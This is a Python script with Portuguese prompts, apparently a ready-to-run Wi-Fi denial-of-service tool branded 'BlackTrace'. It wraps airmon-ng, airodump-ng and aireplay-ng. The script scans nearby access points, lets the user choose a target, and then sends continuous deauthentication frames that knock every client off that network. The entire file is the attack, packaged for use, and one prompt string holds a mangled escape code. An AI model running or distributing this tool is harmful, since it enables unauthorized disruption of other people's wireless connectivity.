import sys
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

redes_sem_fio_ativas = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

def slowprint(s):
	for c in s + '\n' :
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(10. / 100)
os.system("clear")		
print("""\033[92m
  [+]---------------------------------------------------------------------[+] 
   |   __      _____ ___ ___   ___  ___   ___  ___   _____         _       |
   |   \ \    / /_ _| __|_ _| |   \|   \ / _ \/ __| |_   _|__  ___| |      |
   |    \ \/\/ / | || _| | |  | |) | |) | (_) \__ \   | |/ _ \/ _ \ |__    |
   |     \_/\_/ |___|_| |___| |___/|___/ \___/|___/   |_|\___/\___/____|   |
   |                                                                       |
   |                       BY: BlackTrace                                  |
  [+]---------------------------------------------------------------------[+]
                                                                   """)


if not 'SUDO_UID' in os.environ.keys():
    slowprint("\033[91m [!] Tente executar este programa com sudo.")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("\033[93m [!] Não deve haver nenhum arquivo .csv no seu diretório. Encontramos arquivos .csv no seu diretório.")
        diretorio = os.getcwd()
        try:
            os.mkdir(diretorio + "/backup/")
        except:
            slowprint("\033[4m [+] Existe uma pasta de backup.")
        timestamp = datetime.now()
        shutil.move(file_name, diretorio + "/backup/" + str(timestamp) + "-" + file_name)

padrão_wlan = re.compile("^wlan[0-9]+")


verificar_resultado_wifi = padrão_wlan.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(verificar_resultado_wifi) == 0:
    slowprint("\033[91m [?] Conecte um controlador WiFi e tente novamente.")
    exit()

slowprint("\033[92m [+] As seguintes interfaces WiFi estão disponíveis:")
for index, item in enumerate(verificar_resultado_wifi):
    print(f"  {index} - {item}")

while True:
    wifi_interface_escolha = input("\033[96m Selecione a interface que deseja usar para o ataque: ")
    try:
        if verificar_resultado_wifi[int(wifi_interface_escolha)]:
            break
    except:
        print("\033[91m [-] Insira um número que corresponda às opções.")

hacknic = verificar_resultado_wifi[int(wifi_interface_escolha)]

slowprint("\033[91m [+] Adaptador WiFi conectado!\n [*] Agora vamos matar processos conflitantes:")


matar_processos_confilícitos =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless in Monitored mode
slowprint("\033[91m [*] Colocando o adaptador Wi-Fi no modo monitorado:")
colocar_no_modo_monitorado = subprocess.run(["sudo", "airmon-ng", "start", hacknic])


descobrir_acesso_pontos = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for nome_arquivo in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in nome_arquivo:
                    with open(nome_arquivo) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], redes_sem_fio_ativas):
                                redes_sem_fio_ativas.append(row)

        print("\033[91m [*] Digitalização. Pressione Ctrl+C quando quiser selecionar qual rede sem fio deseja atacar.\n")
        print("\033[94m No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(redes_sem_fio_ativas):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\033[92m\n [+] Pronto para fazer a escolha.")

# Ensure that the input choice is valid.
while True:
    choice = input("\033[92m [+] Selecione uma opção acima: ")
    try:
        if redes_sem_fio_ativas[int(choice)]:
            break
    except:
        print("\033[91m [-] Por favor, tente novamente.")

hackbssid = redes_sem_fio_ativas[int(choice)]["BSSID"]
hackchannel = redes_sem_fio_ativas[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, verificar_resultado_wifi[int(wifi_interface_escolha)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

slowprint("\033[94m <============ Pressione Ctrl + C a qualquer momento para abortar ==============> ")
input(slowprint("\033[Potencial de ataque de 91 m carregado. Pressione Enter para continuar  "))	
try:
    while True:
        print("\033[91m ********* Desautenticando clientes **********")
except KeyboardInterrupt:
    slowprint("\033[93m [-] Ataque interrompido ")
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    slowprint("\033[94m 😊😊😊 Obrigado! Saindo agora 😊😊😊")
time.sleep(2)

    
